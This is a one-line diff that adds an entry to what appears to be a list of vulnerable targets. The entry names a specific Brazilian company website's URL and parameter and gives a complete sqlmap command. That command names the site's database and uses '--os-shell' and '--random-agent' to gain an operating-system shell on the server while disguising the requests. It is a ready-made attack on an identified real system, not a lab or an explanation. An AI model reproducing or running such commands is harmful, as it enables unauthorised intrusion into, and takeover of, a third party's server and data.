@@ -1,0 +1,1 @@
+http://www.cellebrasystem.com.br/projetos_view.php?sid=12 (GET)  # sqlmap.py -u http://www.cellebrasystem.com.br/projetos_view.php?sid=12 -D cellebrasystem_com_br --os-shell --threads 5 -v3 --random-agent
